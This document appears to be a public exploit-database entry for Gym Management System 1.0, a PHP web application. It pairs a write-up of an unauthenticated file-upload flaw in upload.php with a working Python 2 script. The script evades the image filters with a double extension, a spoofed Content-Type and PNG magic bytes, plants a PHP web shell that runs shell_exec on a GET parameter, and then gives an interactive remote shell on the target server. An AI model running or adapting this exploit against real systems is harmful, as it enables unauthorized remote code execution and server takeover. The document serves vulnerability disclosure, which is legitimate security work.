# Exploit Author: Bobby Cooke
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
# Exploit Tested Using: Python 2.7.17
# Vulnerability Description: 
#   Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
# Exploit Details:
#   1. Access the &#039;/upload.php&#039; page, as it does not check for an authenticated user session.
#   2. Set the &#039;id&#039; parameter of the GET request to the desired file name for the uploaded PHP file.
#     - `upload.php?id=kamehameha`
#     /upload.php:
#        4 $user = $_GET[&#039;id&#039;];
#       34       move_uploaded_file($_FILES["file"]["tmp_name"],
#       35       "upload/". $user.".".$ext);
#   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
#     /upload.php:
#        5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
#        6 $extension = @end(explode(".", $_FILES["file"]["name"]));
#       14 && in_array($extension, $allowedExts))
#   4. Bypass the file type check by modifying the &#039;Content-Type&#039; of the &#039;file&#039; parameter to &#039;image/png&#039; in the POST request, and set the &#039;pupload&#039; paramter to &#039;upload&#039;.
#        7 if(isset($_POST[&#039;pupload&#039;])){
#        8 if ((($_FILES["file"]["type"] == "image/gif")
#       11 || ($_FILES["file"]["type"] == "image/png")
#   5. In the body of the &#039;file&#039; parameter of the POST request, insert the malicious PHP code:
#       <?php echo shell_exec($_GET["telepathy"]); ?>
#   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the &#039;.&#039; character.
#       30           $pic=$_FILES["file"]["name"];
#       31             $conv=explode(".",$pic);
#       32             $ext=$conv[&#039;1&#039;];
#   - Our uploaded file name was &#039;kaio-ken.php.png&#039;. Therefor $conv[&#039;0&#039;]=&#039;kaio-ken&#039;; $conv[&#039;1&#039;]=&#039;php&#039;; $conv[&#039;2&#039;]=&#039;png&#039;; 
#   7. Communicate with the webshell at &#039;/upload.php?id=kamehameha&#039; using GET Requests with the telepathy parameter.

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+&#039;upload/kamehameha.php&#039;
        getdir  = {&#039;telepathy&#039;: &#039;echo %CD%&#039;}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL
            r2.raise_for_status()
        print(Fore.GREEN+&#039;[+] &#039;+Fore.RESET+&#039;Successfully connected to webshell.&#039;)
        cwd = re.findall(&#039;[CDEF].*&#039;, r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {&#039;telepathy&#039;: thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+&#039;            /\\\n&#039;+RS
    SIG += Fore.YELLOW+&#039;/vvvvvvvvvvvv &#039;+BL+&#039;\\&#039;+FR+&#039;--------------------------------------,\n&#039;
    SIG += Fore.YELLOW+&#039;`^^^^^^^^^^^^&#039;+BL+&#039; /&#039;+FR+&#039;============&#039;+Fore.RED+&#039;BOKU&#039;+FR+&#039;====================="\n&#039;
    SIG += BL+&#039;            \/&#039;+RS+&#039;\n&#039;
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s &#039;https://10.0.0.3:443/gym/&#039;" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = &#039;upload.php?id=kamehameha&#039;
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = &#039;\x89\x50\x4e\x47\x0d\x0a\x1a&#039;
    png     = {
                &#039;file&#039;: 
                  (
                    &#039;kaio-ken.php.png&#039;, 
                    PNG_magicBytes+&#039;\n&#039;+&#039;<?php echo shell_exec($_GET["telepathy"]); ?>&#039;, 
                    &#039;image/png&#039;, 
                    {&#039;Content-Disposition&#039;: &#039;form-data&#039;}
                  ) 
              }
    fdata   = {&#039;pupload&#039;: &#039;upload&#039;}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)

